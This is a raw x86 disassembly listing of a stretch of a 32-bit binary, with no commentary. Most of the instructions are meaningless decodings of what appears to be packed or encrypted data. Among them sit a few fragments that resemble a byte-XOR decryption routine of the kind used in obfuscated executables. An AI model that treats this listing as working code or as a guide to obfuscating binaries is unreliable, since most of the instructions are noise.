  4062a0:	fstp   TBYTE PTR [eax+eax*8]
  4062a3:	inc    ebp
  4062a4:	out    0xfd,eax
  4062a6:	fistp  QWORD PTR [esi+0x1c590a69]
  4062ac:	add    dh,BYTE PTR [ecx+0x31ac69d1]
  4062b2:	add    BYTE PTR [eax],al
  4062b4:	mov    ebx,0x93000000
  4062b9:	inc    ebx
  4062ba:	xchg   esp,eax
  4062bb:	jae    0x4062bf
  4062bd:	sti    
  4062be:	enter  0xf24,0x87
  4062c2:	mov    edx,DWORD PTR [ecx+0x1fd13580]
  4062c8:	fsubp  st(6),st
  4062ca:	ins    BYTE PTR es:[edi],dx
  4062cb:	leave  
  4062cc:	pushf  
  4062cd:	add    DWORD PTR ds:0x618eb5b3,ebp
  4062d3:	out    0xb2,al
  4062d5:	jmp    0x5801711c
  4062da:	(bad)  
  4062dc:	or     edx,ecx
  4062de:	fnstsw WORD PTR [ebp-0x78]
  4062e1:	into   
  4062e2:	add    esi,DWORD PTR [eax+0x40]
  4062e5:	es dec ecx
  4062e7:	jmp    0x4062f7
  4062e9:	addr16 jl 0x4062b9
  4062ec:	bnd jle 0x406328
  4062ef:	sub    al,0x1a
  4062f1:	fsub   st,st(3)
  4062f3:	outs   dx,DWORD PTR ds:[esi]
  4062f4:	retf   
  4062f5:	div    ecx
  4062f7:	push   es
  4062f8:	cdq    
  4062f9:	popf   
  4062fa:	aaa    
  4062fb:	popa   
  4062fc:	dec    edi
  4062fd:	stos   BYTE PTR es:[edi],al
  4062fe:	pop    DWORD PTR [ebp+edx*8-0x1c]
  406302:	pop    eax
  406303:	lea    esi,[esi+0x1c]
  406306:	lds    eax,FWORD PTR [ebx+0x1d5bcdc]
  40630c:	repnz shl BYTE PTR [esi],0xf9
  406310:	jae    0x406389
  406312:	and    al,0x24
  406314:	aam    0xf4
  406316:	nop
  406317:	test   al,0xe0
  406319:	sub    ecx,esp
  40631b:	sub    dh,dh
  40631d:	outs   dx,BYTE PTR ds:[esi]
  40631e:	fwait
  40631f:	sti    
  406320:	inc    edx
  406321:	sbb    DWORD PTR [eax+0x73ed620e],esp
  406327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406328:	push   esi
  406329:	stos   DWORD PTR es:[edi],eax
  40632a:	mov    dl,0xa7
  40632c:	inc    ebx
  40632d:	into   
  40632e:	and    al,0x20
  406330:	pop    ebx
  406331:	jg     0x4062c3
  406333:	xchg   BYTE PTR ds:0x4d9d40cc,al
  406339:	fwait
  40633a:	int    0x9b
  40633c:	inc    esi
  40633d:	fst    QWORD PTR [edi+0x17]
  406340:	(bad)  [ebx+0x41]
  406343:	mov    al,bl
  406345:	mov    edx,0xdfdd699e
  40634a:	mov    ds:0x258f2532,eax
  40634f:	out    0xab,al
  406351:	(bad)  
  406352:	(bad)  
  406353:	fistp  QWORD PTR [ebp-0x79f141a3]
  406359:	mov    ds:0x7fd9029c,eax
  40635e:	push   eax
  40635f:	add    eax,0xdf431a27
  406364:	lock and dl,BYTE PTR [eax+0x74]
  406368:	sbb    al,0x22
  40636a:	mov    edx,0xcac052c6
  40636f:	pop    esi
  406370:	xlat   BYTE PTR ds:[ebx]
  406371:	xchg   ebp,eax
  406372:	xor    ecx,DWORD PTR [ebx-0x2c161bab]
  406378:	add    BYTE PTR [eax],al
  40637a:	add    bh,cl
  40637c:	ins    BYTE PTR es:[edi],dx
  40637d:	lds    ecx,FWORD PTR [esi]
  40637f:	out    0xaf,eax
  406381:	iret   
  406382:	in     eax,dx
  406383:	mov    edx,ebx
  406385:	adc    ecx,DWORD PTR ds:0x70f18bcf
  40638b:	xor    al,BYTE PTR [bx+si]
  40638e:	add    BYTE PTR [ebx+0x68000000],bh
  406394:	mov    ecx,esp
  406396:	shl    eax,cl
  406398:	shr    BYTE PTR [ebp+esi*2+0x63],0x16
  40639d:	je     0x4063b1
  40639f:	nop
  4063a0:	mov    ecx,0xe4e18204
  4063a5:	in     eax,0xb1
  4063a7:	(bad)  
  4063a9:	pop    ebp
  4063aa:	retf   
  4063ab:	sub    eax,esi
  4063ad:	bound  ebx,QWORD PTR [ebp-0x77]
  4063b0:	xchg   edx,eax
  4063b1:	inc    ecx
  4063b2:	retf   
  4063b3:	adc    ch,bl
  4063b5:	pop    es
  4063b6:	shr    BYTE PTR [esi-0x231b83d7],1
  4063bc:	or     al,0x66
  4063be:	or     al,0xa3
  4063c0:	adc    BYTE PTR [ebx],dh
  4063c2:	mov    DWORD PTR gs:0xb8544339,edi
  4063c9:	xlat   BYTE PTR ds:[ebx]
  4063ca:	xor    eax,0x8bc61a14
  4063cf:	adc    BYTE PTR [edx+ecx*2-0x1f75e37e],dl
  4063d6:	sahf   
  4063d7:	sub    DWORD PTR [edi],edx
  4063d9:	fdivrp st(1),st
  4063db:	pop    ds
  4063dc:	es cmp al,0xd0
  4063df:	retf   
  4063e0:	out    dx,eax
  4063e1:	ror    BYTE PTR [esi+0x4a3a861c],cl
  4063e7:	outs   dx,BYTE PTR ds:[esi]
  4063e8:	pop    ss
  4063e9:	dec    ebp
  4063ea:	jl     0x406441
  4063ec:	test   BYTE PTR [ecx-0x647548c],0x4c
  4063f3:	ss (bad) 
  4063f5:	std    
  4063f6:	mov    WORD PTR [eax],?
  4063f8:	inc    esi
  4063f9:	repnz arpl WORD PTR [ecx],si
  4063fc:	mov    al,ds:0xad57a90a
  406401:	inc    edx
  406402:	sahf   
  406403:	cmc    
  406404:	adc    BYTE PTR [ecx],cl
  406406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406407:	sbb    al,0x7d
  406409:	pop    es
  40640a:	je     0x406440
  40640c:	(bad)  
  40640d:	xor    ah,dh
  40640f:	retf   0xc862
  406412:	enter  0xa7ed,0xa3
  406416:	shl    ebp,0xab
  406419:	xchg   BYTE PTR [ebp+0x5019eaf5],bh
  40641f:	pop    eax
  406420:	popa   
  406421:	(bad)  
  406422:	ja     0x406460
  406424:	pop    ss
  406425:	xor    BYTE PTR [ecx+0x38],ch
  406428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406429:	xchg   ecx,eax
  40642b:	jbe    0x406495
  40642d:	jae    0x40645f
  40642f:	xchg   ebp,eax
  406430:	add    BYTE PTR [ebx+0x53],bl
  406433:	pusha  
  406434:	and    al,BYTE PTR [esi+eiz*8-0x1d9b9fb3]
  40643b:	icebp  
  40643c:	jl     0x406424
  40643e:	gs push cs
  406440:	cwde   
  406441:	mov    al,0x9a
  406443:	sbb    al,0x47
  406445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406446:	je     0x406461
  406448:	dec    ecx
  406449:	ja     0x40648b
  40644b:	stc    
  40644c:	call   0x15b7:0xfc633bc
  406453:	fs xor eax,0x152b0043
  406459:	cmp    al,0x36
  40645b:	inc    ebx
  40645c:	add    BYTE PTR [ecx+0x43356415],cl
  406462:	add    BYTE PTR [ebp+0x62490584],cl
  406468:	mov    eax,0xb4158b99
  40646d:	xor    eax,0x15030043
  406472:	shl    BYTE PTR ds:0x15890043,1
  406478:	mov    ah,0x35
  40647a:	inc    ebx
  40647b:	add    cl,ch
  40647d:	rol    DWORD PTR [eax],cl
  40647f:	add    BYTE PTR [eax],al
  406481:	lods   eax,DWORD PTR ds:[esi]
  406482:	sub    ch,BYTE PTR [edi]
  406484:	dec    edi
  406485:	scas   eax,DWORD PTR es:[edi]
  406486:	dec    edi
  406487:	in     eax,dx
  406488:	jmp    0xdf05:0xd5051fb
  40648f:	sub    esi,DWORD PTR [edx+eiz*1+0x33]
  406493:	add    BYTE PTR [eax],al
  406495:	mov    ebx,0x6b000000
  40649a:	mov    ebp,0xd56fc77a
  40649f:	out    dx,eax
  4064a0:	mov    al,0xd1
  4064a2:	pop    ss
  4064a3:	clc    
  4064a4:	cli    
  4064a5:	pop    esi
  4064a6:	scas   al,BYTE PTR es:[edi]
  4064a7:	cwde   
  4064a8:	mov    ch,BYTE PTR [edi]
  4064aa:	sbb    eax,0x8921dade
  4064af:	repz loop 0x40647f
  4064b2:	sar    DWORD PTR [esi],1
  4064b4:	dec    esp
  4064b5:	sbb    ecx,ebx
  4064b7:	sbb    esp,edi
  4064b9:	(bad)  
  4064ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064bb:	int3   
  4064bc:	sysret 
  4064be:	nop
  4064bf:	sbb    al,0xcb
  4064c1:	jb     0x40649c
  4064c3:	or     dh,dl
  4064c5:	cdq    
  4064c6:	into   
  4064c7:	imul   ecx,DWORD PTR [edx-0x1b],0x1c29797d
  4064ce:	(bad)  
  4064cf:	loop   0x406457
  4064d1:	adc    al,0xc8
  4064d3:	out    dx,al
  4064d4:	xor    edi,DWORD PTR ds:0x44506af7
  4064da:	pop    ebx
  4064db:	mov    ebx,0x1e904f46
  4064e0:	mov    ds:0x44f05f0c,eax
  4064e5:	mov    eax,0x32299552
  4064ea:	dec    edx
  4064eb:	xor    al,0x4
  4064ed:	cmp    al,0xcd
  4064ef:	popf   
  4064f0:	cwde   
  4064f1:	loopne 0x4064a6
  4064f3:	enter  0x50de,0x58
  4064f7:	jl     0x4064e1
  4064f9:	je     0x4064a3
  4064fb:	nop
  4064fc:	das    
  4064fd:	loope  0x4064e5
  4064ff:	les    esi,FWORD PTR [edi+0x33afa1fe]
  406505:	scas   eax,DWORD PTR es:[edi]
  406506:	sbb    BYTE PTR [ecx-0x666fbf2],cl
  40650c:	aas    
  40650d:	idiv   ebp
  40650f:	cmp    ecx,DWORD PTR gs:[eax]
  406512:	in     al,dx
  406513:	popa   
  406514:	leave  
  406515:	push   es
  406516:	push   ecx
  406517:	(bad)  
  406518:	outs   dx,BYTE PTR ds:[esi]
  406519:	dec    edx
  40651a:	jmp    0x39854dd4
  40651f:	add    eax,0x4b0b300e
  406524:	xchg   esi,eax
  406525:	mov    cl,0xe7
  406527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406528:	and    al,0x68
  40652a:	fwait
  40652b:	nop
  40652c:	aad    0x10
  40652e:	retf   0xd806
  406531:	jle    0x406531
  406533:	lds    esi,FWORD PTR [edi+0x1d]
  406536:	xchg   DWORD PTR [ebx+eiz*1],edi
  406539:	lock shr BYTE PTR [edx-0x496d94d5],cl
  406540:	cmp    ecx,eax
  406542:	mov    ?,WORD PTR [eax]
  406544:	adc    edx,eax
  406546:	cli    
  406547:	imul   edx,DWORD PTR [edi+ebx*8+0x44d7fec6],0x91b72cdf
  406552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406553:	dec    esp
  406554:	mov    DWORD PTR [ebp+0x10],eax
  406557:	mov    eax,DWORD PTR [ebp-0x20]
  40655a:	mov    edx,DWORD PTR [ebp-0x1c]
  40655d:	jmp    0x406635
  406562:	xchg   ecx,eax
  406563:	pop    ecx
  406564:	sbb    eax,0xb57ddd39
  406569:	stc    
  40656a:	mov    edi,DWORD PTR [esi]
  40656c:	dec    eax
  40656d:	in     al,0x40
  40656f:	sbb    BYTE PTR [edi-0x33],ch
  406572:	fnsave [ebx]
  406574:	add    BYTE PTR [eax],al
  406576:	mov    ebx,0x7f000000
  40657b:	cld    
  40657c:	jne    0x4065c7
  40657e:	sub    esp,DWORD PTR [esp+eiz*4]
  406581:	cmp    al,0xf9
  406583:	and    edi,DWORD PTR [ebx+0x23]
  406586:	mov    ah,0x64
  406588:	stos   DWORD PTR es:[edi],eax
  406589:	push   0x9567725c
  40658e:	and    BYTE PTR [ecx-0x44a822df],bl
  406594:	xor    al,0xf3
  406596:	scas   eax,DWORD PTR es:[edi]
  406597:	mov    esp,0x36ed6bf6
  40659c:	inc    eax
  40659d:	jae    0x4065b9
  40659f:	fwait
  4065a0:	lods   al,BYTE PTR ds:[esi]
  4065a1:	mov    bh,0x96
  4065a3:	sbb    edx,DWORD PTR [edx]
  4065a5:	adc    bl,BYTE PTR ds:0x3bf53e94
  4065ab:	lock adc bl,BYTE PTR [eax]
  4065ae:	retf   0x1e8a
  4065b1:	stos   DWORD PTR es:[edi],eax
  4065b2:	or     al,0xc6
  4065b4:	fisttp WORD PTR [eax+0x2c]
  4065b7:	add    eax,0xc025114c
  4065bc:	inc    edx
  4065bd:	outs   dx,DWORD PTR ds:[esi]
  4065be:	outs   dx,BYTE PTR ds:[esi]
  4065bf:	pop    ebp
  4065c0:	mov    al,0x5e
  4065c2:	add    al,0x62
  4065c4:	hlt    
  4065c5:	sub    eax,0xe2b93e43
  4065ca:	lds    esi,FWORD PTR [ecx+eiz*8+0x690cccf0]
  4065d1:	pop    esi
  4065d2:	call   0xe64c:0x951d3e1f
  4065d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065da:	or     ecx,DWORD PTR [edx]
  4065dc:	pop    DWORD PTR [ecx]
  4065de:	lahf   
  4065df:	iret   
  4065e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065e1:	mov    al,0xd3
  4065e3:	jg     0x406609
  4065e5:	pushf  
  4065e6:	(bad)
  4065e9:	xlat   BYTE PTR ds:[bx]
  4065eb:	adc    cl,BYTE PTR [ebx]
  4065ed:	pop    es
  4065ee:	mov    gs,edi
  4065f0:	adc    ecx,DWORD PTR [ebx-0x605c7ffd]
  4065f6:	mov    bl,0x6d
  4065f8:	and    BYTE PTR [edi],al
  4065fa:	sub    BYTE PTR ds:0x8aa21508,al
  406600:	ja     0x406620
  406602:	enter  0x6e28,0xbe
  406606:	icebp  
  406607:	sub    edi,esp
  406609:	dec    edi
  40660a:	dec    eax
  40660b:	stos   BYTE PTR es:[edi],al
  40660c:	fdiv   st(5),st
  40660e:	jl     0x406638
  406610:	cmp    dh,BYTE PTR [ebx+0x75489b44]
  406616:	mov    al,0x77
  406618:	cwde   
  406619:	fsin   
  40661b:	aam    0xe0
  40661d:	out    dx,al
  40661e:	fadd   DWORD PTR fs:[ecx]
  406621:	xor    dh,BYTE PTR [edi]
  406623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406624:	sahf   
  406625:	ffreep st(5)
  406627:	out    0x6f,eax
  406629:	std    
  40662a:	or     cl,al
  40662c:	out    dx,al
  40662d:	mov    eax,esi
  40662f:	cld    
  406630:	mov    ch,0xa7
  406632:	xor    eax,0x558b25c4
  406637:	clc    
  406638:	xor    eax,esi
  40663a:	or     DWORD PTR ds:0x433648,0x74e3
  406644:	jmp    0x40671c
  406649:	test   al,0x12
  40664b:	fild   QWORD PTR [eax-0x1]
  40664e:	in     eax,dx
  40664f:	mov    edi,0x6000d3d2
  406654:	in     al,0xb5
  406656:	fimul  DWORD PTR [ecx]
  406658:	mov    eax,ds:0x3498
  40665d:	mov    ebx,0xf5000000
  406662:	out    dx,eax
  406663:	adc    BYTE PTR [ecx+0x7c],dh
  406666:	inc    edi
  406667:	ja     0x406639
  406669:	dec    edi
  40666a:	fs xchg ebp,eax
  40666c:	jnp    0x406637
  40666e:	jl     0x40664b
  406670:	cli    
  406671:	ret    0x642f
  406674:	sub    BYTE PTR [ebp-0x9],ch
  406677:	aad    0x49
  406679:	sub    DWORD PTR [edi-0x2dfe6b63],ebp
  40667f:	fst    st(2)
  406681:	or     eax,0x9ee1afa2
  406686:	in     al,0x45
  406688:	mov    ecx,0x1adc137
  40668d:	sti    
  40668e:	mov    WORD PTR [eax],ss
  406690:	xor    eax,DWORD PTR [edx-0x40c1a70c]
  406696:	nop    ebx
  406699:	scas   eax,DWORD PTR es:[edi]
  40669a:	fisubr DWORD PTR [eax]
  40669c:	outs   dx,BYTE PTR ds:[esi]
  40669d:	jnp    0x40666f
  40669f:	cmp    al,0x60
  4066a1:	cld    
  4066a2:	nop
  4066a3:	push   0xe2994102
  4066a8:	int3   
  4066a9:	adc    al,ch
  4066ab:	and    DWORD PTR [eax-0x47],edi
  4066ae:	mov    al,0xf
  4066b0:	cdq    
  4066b1:	aaa    
  4066b2:	cmp    bl,BYTE PTR [eax-0x3aa28953]
  4066b8:	imul   ebp,edi,0xdba53952
  4066be:	mov    ecx,0xa17013fe
  4066c3:	mov    BYTE PTR [edx],al
  4066c5:	sbb    ecx,DWORD PTR [edx]
  4066c7:	shr    BYTE PTR [esi+0x28002498],0x50
  4066ce:	(bad)  
  4066d0:	jge    0x40670d
  4066d2:	and    eax,0x2886cea1
  4066d7:	das    
  4066d8:	into   
  4066d9:	ret    0xed6f
  4066dc:	rcl    ecx,0x5
  4066df:	sub    BYTE PTR [ebx+0x28],bl
  4066e2:	mov    dh,0x71
  4066e4:	or     bl,BYTE PTR [ebx+0x1dfc9c45]
  4066ea:	icebp  
  4066eb:	sub    BYTE PTR ds:0xa3d6a61,al
  4066f1:	sbb    DWORD PTR [esi-0x56],0x47
  4066f5:	leave  
  4066f6:	xor    bh,BYTE PTR [ebp-0x36]
  4066f9:	pop    es
  4066fa:	in     al,0xed
  4066fc:	push   esp
  4066fd:	pusha  
  4066fe:	mov    esp,0x1ad0e928
  406703:	ret    
  406704:	inc    edx
  406705:	rcr    DWORD PTR [edx+ebx*8+0x9],cl
  406709:	pop    edx
  40670a:	fistp  DWORD PTR [esp+edx*1+0x26]
  40670e:	pop    edx
  40670f:	ins    DWORD PTR es:[edi],dx
  406710:	mov    ds:0x14d4c7b7,eax
  406715:	sub    eax,0xf28054d0
  40671a:	dec    edi
  40671b:	sbb    cl,BYTE PTR [edx+0x624d1094]
  406721:	mov    eax,0x3604a199
  406726:	inc    ebx
  406727:	add    BYTE PTR [ecx],dh
  406729:	add    eax,0x4335d8
  40672e:	mov    eax,DWORD PTR [ebp+0x10]
  406731:	sbb    DWORD PTR ds:0x433620,0x6aa6
  40673b:	xor    BYTE PTR [eax],dl
  40673d:	cmp    DWORD PTR ds:0x433650,0x0
  406744:	jbe    0x40683c
  40674a:	sub    DWORD PTR ds:0x43364c,0x3181
  406754:	jmp    0x40683c
  406759:	push   0x4670
  40675e:	call   DWORD PTR ds:0x43c820
  406764:	jmp    0x40683c
  406769:	xor    bh,BYTE PTR [ebp+0x37]
  40676c:	dec    edx
  40676d:	jg     0x4067b9
  40676f:	jg     0x4067ee
  406771:	lahf   
  406772:	outs   dx,BYTE PTR ds:[esi]
  406773:	xor    DWORD PTR [eax+edx*2+0x5367a503],edi
  40677a:	xor    eax,0xbb0000
  40677f:	add    BYTE PTR [eax],al
  406781:	and    eax,0x30646cb3
  406786:	push   es
  406787:	imul   BYTE PTR [eax+ebp*4-0x32]
  40678b:	sahf   
  40678c:	jl     0x40672a
  40678e:	sub    DWORD PTR [ecx-0x69],0x23303fd9
  406795:	cmc    
  406796:	into   
  406797:	in     eax,dx
  406798:	jae    0x406801
  40679a:	cs (bad) 
  40679c:	dec    ebp
  40679d:	je     0x40680b
  40679f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a0:	outs   dx,DWORD PTR ds:[esi]
  4067a1:	xchg   ebp,eax
  4067a2:	push   ebp
  4067a3:	repz lahf 
  4067a5:	mov    DWORD PTR [eax+0x2dda4de9],edx
  4067ab:	cmp    eax,edx
  4067ad:	(bad)  
  4067ae:	call   0x688c:0xce3f799e
  4067b5:	pusha  
  4067b6:	inc    ebp
  4067b7:	pop    es
  4067b8:	or     al,0x69
  4067ba:	mov    BYTE PTR [ebx],bl
  4067bc:	sbb    edi,DWORD PTR [ebx]
  4067be:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4067c0:	adc    eax,0x9b6547f0
  4067c5:	mov    al,0xc
  4067c7:	cdq    
  4067c8:	rcr    edx,cl
  4067ca:	(bad)  
  4067cb:	adc    ebp,esp
  4067cd:	push   esp
  4067ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067cf:	retf   
  4067d0:	fiadd  WORD PTR [edx-0x41]
  4067d3:	pop    ss
  4067d4:	xchg   ebx,eax
  4067d5:	pop    es
  4067d6:	add    edx,edi
  4067d8:	mov    edx,0x6a41396a
  4067dd:	inc    edi
  4067de:	ret    0xa496
  4067e1:	mov    WORD PTR [edi+0x55],?
  4067e4:	add    ch,BYTE PTR [eax]
  4067e6:	outs   dx,BYTE PTR ds:[esi]
  4067e7:	mov    ebp,0x494b37eb
  4067ec:	sub    DWORD PTR [esi-0x171f357],ecx
  4067f2:	addr16 xchg esp,eax
  4067f4:	adc    eax,0x9a41114a
  4067f9:	dec    esi
  4067fa:	jle    0x406797
  4067fc:	mov    edx,0x65a3b0c
  406801:	leave  
  406802:	out    dx,al
  406803:	pcmpgtb mm5,QWORD PTR [ecx+0x377f81e6]
  40680a:	fwait
  40680b:	cwde   
  40680c:	outs   dx,BYTE PTR ds:[esi]
  40680d:	lds    esi,FWORD PTR [ecx-0x16]
  406810:	pop    ebp
  406811:	gs mov ah,0x22
  406814:	push   esp
  406815:	xchg   edx,eax
  406816:	pop    ebp
  406817:	inc    ebx
  406818:	xor    eax,0xb845299
  40681d:	sub    edi,0x31
  406820:	fwait
  406821:	jle    0x406803
  406823:	jne    0x40689a
  406825:	mov    dh,0x69
  406827:	inc    ebp
  406828:	mov    ebx,0xaf012a53
  40682d:	inc    esp
  40682e:	mov    bl,0x7f
  406830:	mov    dh,0x3b
  406832:	dec    esi
  406833:	mov    DWORD PTR [ebp-0xd306af9],edi
  406839:	add    DWORD PTR [ebx+0x5a],ebp
  40683c:	mov    eax,DWORD PTR [ebp-0x18]
  40683f:	mov    edx,DWORD PTR [ebp-0x14]
  406842:	jmp    0x40691a
  406847:	call   0x9ed3:0xcd8284d7
  40684e:	fbstp  TBYTE PTR [ebx]
  406850:	cmp    eax,0x1fdd60a5
  406855:	fistp  WORD PTR [edi+0x360e]
  40685b:	mov    ebx,0xa5000000
  406860:	push   ds
  406861:	jnp    0x4068a7
  406863:	ror    bh,0x4d
  406866:	xchg   edi,eax
  406867:	xchg   edx,eax
  406868:	imul   eax,DWORD PTR [ecx+0x38],0xfffffff3
  40686c:	retf   0x2f94
  40686f:	rcl    DWORD PTR [ebx+0x1f],1
  406872:	in     al,dx
  406873:	(bad)  
  406874:	ss in  al,dx
  406876:	std    
  406877:	push   ebp
  406878:	aas    
  406879:	hlt    
  40687a:	leave  
  40687b:	mov    edi,0xb82fa35f
  406880:	lahf   
  406881:	into   
  406882:	dec    edi
  406883:	push   ebp
  406884:	mov    esi,0xd95e709
  406889:	sbb    al,0xc
  40688b:	cmp    eax,0x7fcc61d
  406890:	pand   mm3,mm5
  406893:	loop   0x40684b
  406895:	ret    
  406896:	sub    ecx,DWORD PTR [ebx-0x7d]
  406899:	leave  
  40689a:	in     al,0x5a
  40689c:	pop    es
  40689d:	cmp    ecx,DWORD PTR gs:[ecx+0x4c]
  4068a1:	mov    eax,0x8f2fd86d
  4068a6:	cmp    eax,0x9655c5f4
  4068ab:	dec    edx
  4068ac:	push   0xda4ee834
  4068b1:	sti    
  4068b2:	test   DWORD PTR [esi],ebx
  4068b4:	mov    dh,0x4f
  4068b6:	in     eax,0x2b
  4068b8:	pusha  
  4068b9:	js     0x40690a
  4068bb:	push   ebp
  4068bc:	and    bh,BYTE PTR [ecx]
  4068be:	xchg   ecx,eax
  4068bf:	push   edi
  4068c0:	mov    ebp,0x842df256
  4068c5:	ins    DWORD PTR es:[edi],dx
  4068c6:	jmp    0xc07d:0xc830b17e
  4068cd:	ds pop ebp
  4068cf:	cmp    BYTE PTR [ecx-0x39],0x89
  4068d3:	cmp    al,BYTE PTR [edi-0x534c8e97]
  4068d9:	cmp    DWORD PTR [ebx-0x39e2d35b],esi
  4068df:	loopne 0x4068ae
  4068e1:	fsubp  st(6),st
  4068e3:	xchg   ebp,eax
  4068e4:	dec    edi
  4068e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e6:	out    dx,al
  4068e7:	adc    eax,ebx
  4068e9:	lods   eax,DWORD PTR ds:[esi]
  4068ea:	mov    dh,0x2f
  4068ec:	lea    esp,[edx-0x5a]
  4068ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068f0:	mov    bh,0xca
  4068f2:	adc    eax,0x82219f8c
  4068f7:	or     DWORD PTR [ecx+0x10],edx
  4068fa:	stos   BYTE PTR es:[edi],al
  4068fb:	pop    ss
  4068fc:	in     al,dx
  4068fd:	pop    eax
  4068fe:	mov    edi,DWORD PTR ds:0xbb9310b0
  406904:	sbb    ebx,0xa93edc88
  40690a:	dec    ebp
  40690b:	adc    bh,BYTE PTR [ebx+0x18316544]
  406911:	fbstp  TBYTE PTR [esi]
  406913:	stc    
  406914:	push   esp
  406915:	dec    edx
  406916:	pushf  
  406917:	or     eax,0xc6339f68
  40691c:	jmp    0x4069f4
  406921:	jae    0x4068af
  406923:	sub    edi,0x9c7fefff
  406929:	inc    esp
  40692a:	fwait
  40692b:	xchg   ebx,eax
  40692c:	(bad)
  406930:	imul   ecx,ecx,0xbb000036
  406936:	add    BYTE PTR [eax],al
  406938:	add    BYTE PTR [ebp+0x4b],ah
  40693b:	push   esi
  40693c:	or     BYTE PTR [edx+0x7db3749c],al
  406942:	sub    DWORD PTR [ecx+0x14],ebx
  406945:	or     eax,0x65661bcb
  40694a:	(bad)  
  40694b:	sti    
  40694c:	rol    BYTE PTR [edi-0x40b03059],cl
  406952:	into   
  406953:	or     BYTE PTR [esi-0x29fb0afd],ch
  406959:	shl    BYTE PTR [esi-0x107c34e1],1
  40695f:	jl     0x40695c
  406961:	dec    edi
  406962:	jae    0x4069d8
  406964:	fwait
  406965:	xor    ah,BYTE PTR [eax+0x78]
  406968:	mov    eax,ds:0xc1f735ce
  40696e:	pop    esp
  40696f:	push   esi
  406970:	imul   ecx,DWORD PTR [esi+eax*2-0x18953e49],0x2c
  406978:	sbb    bh,bl
  40697a:	xor    eax,DWORD PTR [esi+esi*1]
  40697d:	and    edi,DWORD PTR [ebx+edi*1+0x7d]
  406981:	call   0x8986d8b2
  406986:	cmp    ch,BYTE PTR [eax-0x1a89cdd9]
  40698c:	aas    
  40698d:	int    0xf7
  40698f:	in     al,0xd9
  406991:	sub    BYTE PTR [edi-0x3d383dcc],bl
  406997:	sub    al,0x6b
  406999:	xor    eax,0x9a00d9e0
  40699e:	adc    al,0xc1
  4069a0:	ror    BYTE PTR [esi+esi*2-0x273c4cce],cl
  4069a7:	call   0x66001158
  4069ac:	lods   al,BYTE PTR ds:[esi]
  4069ad:	dec    ebx
  4069ae:	sbb    dh,dl
  4069b0:	ss repnz retf 0x57e0
  4069b5:	ret    0xfde5
  4069b8:	iret   
  4069b9:	(bad)  [edx-0x183c1b7f]
  4069bf:	push   0x6c
  4069c1:	neg    ah
  4069c3:	mov    ds:0x3c888b49,al
  4069c8:	pop    ebp
  4069c9:	push   cs
  4069ca:	add    eax,0x265d2a0f
  4069cf:	(bad)  
  4069d0:	rcr    BYTE PTR [eax+0x211e1f21],cl
  4069d6:	dec    ebx
  4069d7:	popa   
  4069d8:	in     eax,dx
  4069d9:	or     eax,0xe8a9f5ee
  4069de:	gs or  eax,0x7048feb7
  4069e4:	pusha  
  4069e5:	enter  0x3cbc,0x4c
  4069e9:	jl     0x40697e
  4069eb:	sbb    BYTE PTR [eax],ch
  4069ed:	sbb    BYTE PTR [eax],ch
  4069ef:	cs cdq 
  4069f1:	icebp  
  4069f2:	dec    esi
  4069f3:	or     DWORD PTR [ebp+0x62490584],ecx
  4069f9:	mov    eax,0x10458999
  4069fe:	mov    eax,DWORD PTR [ebp-0x18]
  406a01:	and    edx,0x55e7
  406a07:	mov    edx,DWORD PTR [ebp-0x14]
  406a0a:	or     DWORD PTR ds:0x433580,0x644b
  406a14:	mov    edx,DWORD PTR [ebp-0x8]
  406a17:	sub    DWORD PTR ds:0x43355c,0x43357c
  406a21:	xor    eax,esi
  406a23:	mov    dl,BYTE PTR [eax+edx*1-0x66479db3]
  406a2a:	mov    eax,DWORD PTR [ebp+0x10]
  406a2d:	xor    BYTE PTR [eax],dl
  406a2f:	mov    eax,DWORD PTR [ebp+0x18]
  406a32:	jmp    0x406b0a
  406a37:	je     0x406a8f
  406a39:	lea    esp,[ebx]
  406a3b:	scas   eax,DWORD PTR es:[edi]
  406a3c:	sti    
  406a3d:	(bad)  
  406a3e:	push   edi
  406a3f:	stos   BYTE PTR es:[edi],al
  406a40:	xor    eax,0xb32cbf63
  406a45:	jne    0x406a13
  406a47:	test   BYTE PTR [edi],dh
  406a49:	add    BYTE PTR [eax],al
  406a4b:	mov    ebx,0x72000000
  406a50:	jle    0x406a7e
  406a52:	gs sti 
  406a54:	fist   DWORD PTR [ebx+edx*4]
  406a57:	mov    dl,0x19
  406a59:	mov    esp,0x4e34a666
  406a5e:	sub    BYTE PTR [edx-0x34],dh
  406a61:	sub    cl,BYTE PTR [edi-0x1516dc3d]
  406a67:	xchg   ebx,eax
  406a68:	mov    dl,0x9e
  406a6a:	push   0xc6a640c
  406a6f:	adc    esi,DWORD PTR [eax-0x42]
  406a72:	int    0x64
  406a74:	xchg   ebx,eax
  406a75:	pop    ebx
  406a76:	ficom  DWORD PTR [ebx]
  406a78:	mov    cl,0x9a
  406a7a:	sar    DWORD PTR [edi+0x30],cl
  406a7d:	mov    bh,0x3d
  406a7f:	pop    edi
  406a80:	pop    es
  406a81:	std    
  406a82:	and    DWORD PTR ds:0xfc939750,ebp
  406a88:	add    dl,al
  406a8a:	lock outs dx,BYTE PTR ds:[esi]
  406a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a8d:	mov    ds:0xde591c8d,al
  406a92:	add    al,0xad
  406a94:	jge    0x406ac4
  406a96:	mov    BYTE PTR [esi+0x2e],bh
  406a99:	outs   dx,BYTE PTR ds:[esi]
  406a9a:	into   
  406a9b:	and    BYTE PTR [eax-0x3e13f7fa],ch
  406aa1:	enter  0xc309,0x43
  406aa5:	xchg   BYTE PTR [ebp-0x3e30ec28],cl
